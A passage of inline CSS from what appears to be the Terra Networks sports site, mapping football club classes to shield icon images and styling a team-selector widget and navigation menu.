		.zaz--standalone .team--c62c4d043b39a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-america-mg.svg")
		}

		.zaz--standalone .icon-shield-america,
		.zaz--standalone .team--489bc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-america.svg")
		}

		.zaz--standalone .icon-shield-antofagasta,
		.zaz--standalone .team--ac6975ebb709b310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-antofagasta.svg")
		}

		.zaz--standalone .icon-shield-atlante,
		.zaz--standalone .team--atlante {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-atlante.svg")
		}

		.zaz--standalone .icon-shield-atlas-de-guadalajara,
		.zaz--standalone .team--e8ebc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-atlas-de-guadalajara.svg")
		}

		.zaz--standalone .icon-shield-atletico-go,
		.zaz--standalone .team--a598e05a9698a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-atletico-go.svg")
		}

		.zaz--standalone .icon-shield-atletico-mg,
		.zaz--standalone .team--a15a5c528898a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-atletico-mg.svg")
		}

		.zaz--standalone .icon-shield-atletico-pr,
		.zaz--standalone .team--afe1c2779a39a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-atletico-pr.svg")
		}

		.zaz--standalone .icon-shield-audax-italiano,
		.zaz--standalone .team--c117eb98789d2410VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-audax-italiano.svg")
		}

		.zaz--standalone .icon-shield-avai,
		.zaz--standalone .team--85f24bed1c39a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-avai.svg")
		}

		.zaz--standalone .icon-shield-bahia,
		.zaz--standalone .team--0c7a5c511b98a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-bahia.svg")
		}

		.zaz--standalone .icon-shield-barnechea,
		.zaz--standalone .team--dd224afb3add6410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-barnechea.svg")
		}

		.zaz--standalone .icon-shield-boa,
		.zaz--standalone .team--a7104f774e29a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-boa.svg")
		}

		.zaz--standalone .icon-shield-botafogo-sp,
		.zaz--standalone .team--e6d08133abcd4409543d69f3967e4a2905yz0xd5 {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-botafogo-sp.svg")
		}

		.zaz--standalone .icon-shield-botafogo,
		.zaz--standalone .team--00231566d998a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-botafogo.svg")
		}

		.zaz--standalone .icon-shield-bragantino,
		.zaz--standalone .team--f33af9aebc39a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-bragantino.svg")
		}

		.zaz--standalone .icon-shield-brasil-de-pelotas,
		.zaz--standalone .team--11da3da913c19e70229883ba08629a1b9ck1vdvd {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-brasil-de-pelotas.svg")
		}

		.zaz--standalone .icon-shield-brusque,
		.zaz--standalone .team--f6ea0b501d185c8e9b64d047830fc6d13e2jfs3e {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-brusque.svg")
		}

		.zaz--standalone .icon-shield-ceara,
		.zaz--standalone .team--2397f9aebc39a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-ceara.svg")
		}

		.zaz--standalone .icon-shield-celaya,
		.zaz--standalone .team--celaya {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-celaya.svg")
		}

		.zaz--standalone .icon-shield-chapecoense,
		.zaz--standalone .team--05943187fc25b310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-chapecoense.svg")
		}

		.zaz--standalone .icon-shield-cobresal,
		.zaz--standalone .team--633fa1cb5fdd2410VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-cobresal.svg")
		}

		.zaz--standalone .icon-shield-colo-colo,
		.zaz--standalone .team--5c11c98f90ed2410VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-colo-colo.svg")
		}

		.zaz--standalone .icon-shield-confianca,
		.zaz--standalone .team--17a053a41e2354a4d4a8da88e2fa70d24q06cnb0 {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-confianca.svg")
		}

		.zaz--standalone .icon-shield-corinthians,
		.zaz--standalone .team--006f2f079b98a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-corinthians.svg")
		}

		.zaz--standalone .icon-shield-coritiba,
		.zaz--standalone .team--7d3732dd9c29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-coritiba.svg")
		}

		.zaz--standalone .icon-shield-correcaminos-de-la-uat,
		.zaz--standalone .team--correcaminos-de-la-uat {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-correcaminos-de-la-uat.svg")
		}

		.zaz--standalone .icon-shield-crb,
		.zaz--standalone .team--bba33c8e5d29a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-crb.svg")
		}

		.zaz--standalone .icon-shield-criciuma,
		.zaz--standalone .team--c2a464ba4a39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-criciuma.svg")
		}

		.zaz--standalone .icon-shield-cruz-azul,
		.zaz--standalone .team--ab3cc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-cruz-azul.svg")
		}

		.zaz--standalone .icon-shield-cruzeiro,
		.zaz--standalone .team--38763c149d29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-cruzeiro.svg")
		}

		.zaz--standalone .icon-shield-csa,
		.zaz--standalone .team--1f211e598caabac82eae5076171e708c3769j6ez {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-csa.svg")
		}

		.zaz--standalone .icon-shield-cuiaba,
		.zaz--standalone .team--697e4497dbf0df7727b2216846cd2de8r2xyo2t3 {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-cuiaba.svg")
		}

		.zaz--standalone .icon-shield-delfines,
		.zaz--standalone .team--delfines {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-delfines.svg")
		}

		.zaz--standalone .icon-shield-dorados-de-sinaloa,
		.zaz--standalone .team--bcf092a3fad1dcea40cc9ab2c30beeb9ztytRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-dorados-de-sinaloa.svg")
		}

		.zaz--standalone .icon-shield-estudiantes-tecos,
		.zaz--standalone .team--9c6cc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-estudiantes-tecos.svg")
		}

		.zaz--standalone .icon-shield-figueirense,
		.zaz--standalone .team--90697e147de8a310VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-figueirense.svg")
		}

		.zaz--standalone .icon-shield-flamengo,
		.zaz--standalone .team--3c3c17ea2b98a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-flamengo.svg")
		}

		.zaz--standalone .icon-shield-fluminense,
		.zaz--standalone .team--ba4a93c47a98a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-fluminense.svg")
		}

		.zaz--standalone .icon-shield-fortaleza,
		.zaz--standalone .team--a20707f095b287a62982086647e03495gjg5tijs {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-fortaleza.svg")
		}

		.zaz--standalone .icon-shield-goias,
		.zaz--standalone .team--1495e30dfa39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-goias.svg")
		}

		.zaz--standalone .icon-shield-gremio,
		.zaz--standalone .team--9e4d5f485f29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-gremio.svg")
		}

		.zaz--standalone .icon-shield-guadalajara,
		.zaz--standalone .team--guadalajara {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-guadalajara.svg")
		}

		.zaz--standalone .icon-shield-guarani,
		.zaz--standalone .team--abe70a8c9b39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-guarani.svg")
		}

		.zaz--standalone .icon-shield-guerreros,
		.zaz--standalone .team--guerreros {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-guerreros.svg")
		}

		.zaz--standalone .icon-shield-indios,
		.zaz--standalone .team--indios {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-indios.svg")
		}

		.zaz--standalone .icon-shield-internacional,
		.zaz--standalone .team--69fe1fc53b29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-internacional.svg")
		}

		.zaz--standalone .icon-shield-irapuato,
		.zaz--standalone .team--irapuato {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-irapuato.svg")
		}

		.zaz--standalone .icon-shield-jaguares-de-chiapas,
		.zaz--standalone .team--f18cc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-jaguares-de-chiapas.svg")
		}

		.zaz--standalone .icon-shield-joinville,
		.zaz--standalone .team--f66927734c39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-joinville.svg")
		}

		.zaz--standalone .icon-shield-juventude,
		.zaz--standalone .team--c921be6d19ae42699da57ab4ebb107d6h4hpsfx2 {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-juventude.svg")
		}

		.zaz--standalone .icon-shield-leon,
		.zaz--standalone .team--618168e1daa08310VgnVCM3000009acceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-leon.svg")
		}

		.zaz--standalone .icon-shield-leones-negros,
		.zaz--standalone .team--09a3b058759d6410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-leones-negros.svg")
		}

		.zaz--standalone .icon-shield-lobos-buap,
		.zaz--standalone .team--lobos {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-lobos-buap.svg")
		}

		.zaz--standalone .icon-shield-londrina,
		.zaz--standalone .team--adbf100b5cb09af275daac136fe1c1dbasx4wfkk {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-londrina.svg")
		}

		.zaz--standalone .icon-shield-luverdense,
		.zaz--standalone .team--a0dc6cc0de092410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-luverdense.svg")
		}

		.zaz--standalone .icon-shield-macae,
		.zaz--standalone .team--macae {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-macae.svg")
		}

		.zaz--standalone .icon-shield-magallanes,
		.zaz--standalone .team--magallanes {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-magallanes.svg")
		}

		.zaz--standalone .icon-shield-merida,
		.zaz--standalone .team--merida {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-merida.svg")
		}

		.zaz--standalone .icon-shield-mogi-mirim,
		.zaz--standalone .team--mogi-mirim {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-mogi-mirim.svg")
		}

		.zaz--standalone .icon-shield-monarcas-morelia,
		.zaz--standalone .team--de9cc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-monarcas-morelia.svg")
		}

		.zaz--standalone .icon-shield-monterrey,
		.zaz--standalone .team--94dd27b31124b310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-monterrey.svg")
		}

		.zaz--standalone .icon-shield-nautico,
		.zaz--standalone .team--b83d7e147de8a310VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-nautico.svg")
		}

		.zaz--standalone .icon-shield-necaxa,
		.zaz--standalone .team--798390de099dad950ca43c479e4281f97zkfqtta {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-necaxa.svg")
		}

		.zaz--standalone .icon-shield-neza,
		.zaz--standalone .team--neza {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-neza.svg")
		}

		.zaz--standalone .icon-shield-oeste,
		.zaz--standalone .team--22028de2db16b310VgnVCM3000009acceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-oeste.svg")
		}

		.zaz--standalone .icon-shield-ohiggins,
		.zaz--standalone .team--e84065eff8ed2410VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-ohiggins.svg")
		}

		.zaz--standalone .icon-shield-operario-pr,
		.zaz--standalone .team--1a5480c6907d53f114675f55aa753f6d05y4pa3b {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-operario-pr.svg")
		}

		.zaz--standalone .icon-shield-pachuca,
		.zaz--standalone .team--f8bcc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-pachuca.svg")
		}

		.zaz--standalone .icon-shield-palmeiras,
		.zaz--standalone .team--90c2fe71be29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-palmeiras.svg")
		}

		.zaz--standalone .icon-shield-parana,
		.zaz--standalone .team--6ebc2c13ac39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-parana.svg")
		}

		.zaz--standalone .icon-shield-paysandu,
		.zaz--standalone .team--36507c84f116b310VgnVCM3000009acceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-paysandu.svg")
		}

		.zaz--standalone .icon-shield-ponte-preta,
		.zaz--standalone .team--5ab15745ba29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-ponte-preta.svg")
		}

		.zaz--standalone .icon-shield-puebla,
		.zaz--standalone .team--157dc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-puebla.svg")
		}

		.zaz--standalone .icon-shield-pumas-unam,
		.zaz--standalone .team--219dc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-pumas-unam.svg")
		}

		.zaz--standalone .icon-shield-queretaro,
		.zaz--standalone .team--dcbdc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-queretaro.svg")
		}

		.zaz--standalone .icon-shield-rangers,
		.zaz--standalone .team--rangers {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-rangers.svg")
		}

		.zaz--standalone .icon-shield-reboceros-de-la-piedad,
		.zaz--standalone .team--reboceros {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-reboceros-de-la-piedad.svg")
		}

		.zaz--standalone .icon-shield-remo,
		.zaz--standalone .team--88c8d0970621d093a666238275c7798fvnb14w37 {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-remo.svg")
		}

		.zaz--standalone .icon-shield-sampaio-correa,
		.zaz--standalone .team--0429e8581e182410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-sampaio-correa.svg")
		}

		.zaz--standalone .icon-shield-san-luis,
		.zaz--standalone .team--4bfdc12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-san-luis.svg")
		}

		.zaz--standalone .icon-shield-santacruz,
		.zaz--standalone .team--064171ba89182410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-santacruz.svg")
		}

		.zaz--standalone .icon-shield-santiago-morning,
		.zaz--standalone .team--santiago-morning {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-santiago-morning.svg")
		}

		.zaz--standalone .icon-shield-santiago-wanderers,
		.zaz--standalone .team--santiago-wanderers {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-santiago-wanderers.svg")
		}

		.zaz--standalone .icon-shield-santos-laguna,
		.zaz--standalone .team--013ec12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-santos-laguna.svg")
		}

		.zaz--standalone .icon-shield-santos,
		.zaz--standalone .team--7c679e9aff29a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-santos.svg")
		}

		.zaz--standalone .icon-shield-sao-bento,
		.zaz--standalone .team--c2d2dc12fd66bea933bd091338bdd3d829xsswnx {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-sao-bento.svg")
		}

		.zaz--standalone .icon-shield-saopaulo,
		.zaz--standalone .team--555dd69f2139a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-saopaulo.svg")
		}

		.zaz--standalone .icon-shield-sport,
		.zaz--standalone .team--66b5fad1f739a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-sport.svg")
		}

		.zaz--standalone .icon-shield-tiburones-rojos-veracruz,
		.zaz--standalone .team--tiburones-rojos-veracruz {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-tiburones-rojos-veracruz.svg")
		}

		.zaz--standalone .icon-shield-tigres-uanl-reynosa,
		.zaz--standalone .team--9e5ec12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-tigres-uanl-reynosa.svg")
		}

		.zaz--standalone .icon-shield-tijuana,
		.zaz--standalone .team--05aec12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-tijuana.svg")
		}

		.zaz--standalone .icon-shield-toluca,
		.zaz--standalone .team--54cec12c65fa3310VgnVCM3000009af154d0RCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-toluca.svg")
		}

		.zaz--standalone .icon-shield-tupi,
		.zaz--standalone .team--5c1d53b2e5fe1600051d95b85d46a7b1g1moe6aw {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-tupi.svg")
		}

		.zaz--standalone .icon-shield-union-la-calera,
		.zaz--standalone .team--cedad18f4bed2410VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-union-la-calera.svg")
		}

		.zaz--standalone .icon-shield-universidad-de-chile,
		.zaz--standalone .team--d014e291bbed2410VgnVCM4000009bcceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-universidad-de-chile.svg")
		}

		.zaz--standalone .icon-shield-valdivia,
		.zaz--standalone .team--valdivia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-valdivia.svg")
		}

		.zaz--standalone .icon-shield-vasco,
		.zaz--standalone .team--6c88e1db2939a310VgnVCM5000009ccceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-vasco.svg")
		}

		.zaz--standalone .icon-shield-vila-nova,
		.zaz--standalone .team--34399132a0192410VgnVCM10000098cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-vila-nova.svg")
		}

		.zaz--standalone .icon-shield-vitoria,
		.zaz--standalone .team--9680d4628d39a310VgnVCM20000099cceb0aRCRD {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/shields/shield-vitoria.svg")
		}

		/*# sourceURL=https://s1.trrsf.com/update-1619184946/fe/zaz-mod-icons/_css/shieldsstandalone.min.css */
	</style>
	<style type="text/css">
		/* Terra Networks */
		.app-teams__content {
			text-align: center;
			max-width: 270px;
			margin: 2px auto;
			position: relative;
			height: 188px
		}

		.app-teams__content__list {
			text-align: center;
			margin-top: 10px;
			display: none
		}

		.app-teams__content__list.is-active {
			display: inline-block
		}

		.app-teams__team {
			display: block;
			float: left;
			width: 20%;
			margin: 5px 0
		}

		.app-teams__team:focus,
		.app-teams__team:hover {
			-ms-transform: scale(1.1);
			-webkit-transform: scale(1.1);
			-moz-transform: scale(1.1);
			transform: scale(1.1);
			opacity: .8;
			outline: 0
		}

		.app-teams__header {
			margin: 15px;
			height: 20px
		}

		.app-teams__header__title {
			display: none
		}

		.app-teams__header__text {
			font-weight: 400 !important;
			font-size: 14px;
			font-family: Ubuntu;
			text-transform: uppercase;
			line-height: 1;
			text-align: center;
			transition: all 200ms linear
		}

		.app-teams__header__text:focus,
		.app-teams__header__text:hover {
			opacity: .7
		}

		.app-teams__header__menu {
			text-align: center
		}

		.app-teams__header__item {
			display: inline
		}

		.app-teams .app-teams__button:focus,
		.app-teams .app-teams__button:hover {
			color: #191917;
			border: 1px solid #a5a598;
			z-index: 1
		}

		.app-teams__button {
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear;
			font-family: Ubuntu;
			display: inline-block;
			border: 1px solid #a5a598;
			background-color: #fff;
			border-radius: 3px;
			width: 65px;
			height: 25px;
			vertical-align: middle;
			padding: 5px;
			line-height: 1;
			color: #191917;
			text-transform: lowercase;
			font-size: 14px;
			z-index: 1;
			position: relative;
			box-shadow: inset 0 0 6px -2px #ccc;
			margin-right: -5px;
			cursor: pointer
		}

		.app-teams__button.is-disabled {
			color: #65655d;
			z-index: 0;
			border: 1px solid #d7d7d7;
			background-color: #f1f1f1
		}

		.app-teams__footer {
			padding: 15px 20px 0
		}

		.app-teams__labelto {
			font-size: 14px;
			left: 12px;
			bottom: 5px;
			float: right
		}

		.app-teams__labelto__link {
			float: left
		}

		.app-teams__labelto__text {
			display: inline-block;
			text-align: right
		}

		.app-teams__labelto__icon {
			display: inline-block;
			margin-left: 10px
		}

		.app-teams__labelto:focus,
		.app-teams__labelto:hover {
			opacity: .85
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__header,
		.w1280 .cards.w2h1 .app-teams__header,
		.w320 .cards.w2h1 .app-teams__header,
		.w768 .cards.w2h1 .app-teams__header {
			margin: 3px 0
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__header__title,
		.w1280 .cards.w2h1 .app-teams__header__title,
		.w320 .cards.w2h1 .app-teams__header__title,
		.w768 .cards.w2h1 .app-teams__header__title {
			display: inline-block
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__header__title__link,
		.w1280 .cards.w2h1 .app-teams__header__title__link,
		.w320 .cards.w2h1 .app-teams__header__title__link,
		.w768 .cards.w2h1 .app-teams__header__title__link {
			font-family: Ubuntu;
			font-size: 12px;
			color: #66af24;
			margin-left: 12px;
			font-weight: 700
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__header__menu,
		.w1280 .cards.w2h1 .app-teams__header__menu,
		.w320 .cards.w2h1 .app-teams__header__menu,
		.w768 .cards.w2h1 .app-teams__header__menu {
			float: right;
			margin-right: 17px
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__button,
		.w1280 .cards.w2h1 .app-teams__button,
		.w320 .cards.w2h1 .app-teams__button,
		.w768 .cards.w2h1 .app-teams__button {
			width: 48px;
			height: 18px;
			padding-top: 3px;
			font-size: 11px;
			margin-right: -4px
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__content,
		.w1280 .cards.w2h1 .app-teams__content,
		.w320 .cards.w2h1 .app-teams__content,
		.w768 .cards.w2h1 .app-teams__content {
			max-width: none;
			margin: 0 0 0 5px
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__team,
		.w1280 .cards.w2h1 .app-teams__team,
		.w320 .cards.w2h1 .app-teams__team,
		.w768 .cards.w2h1 .app-teams__team {
			width: 14%;
			margin: 2px 0
		}

		.w1024 .cards.w2h1.noflex-1024 .app-teams__team .icon,
		.w1280 .cards.w2h1 .app-teams__team .icon,
		.w320 .cards.w2h1 .app-teams__team .icon,
		.w768 .cards.w2h1 .app-teams__team .icon {
			width: 24px;
			height: 24px;
			background-size: 24px auto
		}

		.nightmode .app-teams__button {
			background-color: #33332f
		}

		.nightmode .app-teams__button:focus,
		.nightmode .app-teams__button:hover {
			color: #f1f1f1
		}

		.nightmode .app-teams__button.is-disabled {
			background-color: #f1f1f1;
			color: #65655d
		}

		/*# sourceURL=https://s1.trrsf.com/update-1578598254/fe/zaz-app-teams/_css/theme-defaultstandalone.min.css */
	</style>
	<style type="text/css">
		/* Terra Networks */
		.trr-globalnav .trr-logotipia {
			z-index: 1000
		}

		.trr-menu .trr-section-footer,
		.trr-menu .trr-section-title {
			width: 100%;
			text-align: right;
			text-transform: uppercase
		}

		.trr-menu .trr-section-footer a,
		.trr-menu .trr-section-title a {
			display: block;
			float: right;
			text-decoration: none;
			color: #191917;
			font-size: 14px;
			margin-right: 10px;
			margin-bottom: 5px
		}

		.trr-menu .trr-section-title p {
			float: left;
			line-height: 14px;
			width: 143px
		}

		.trr-menu .trr-menu-footer .trr-section-title p {
			float: left;
			line-height: 14px;
			width: 100px
		}

		.trr-menu .trr-section-footer p {
			margin-top: 7px;
			float: left;
			width: 140px
		}

		.trr-menu .trr-section-title .icon-follow {
			float: left;
			margin-left: 5px;
			margin-top: -5px
		}

		.trr-menu .trr-section-footer .icon-follow {
			margin-top: -3px
		}

		.trr-menu .trr-menu-footer .trr-section-title .icon-follow {
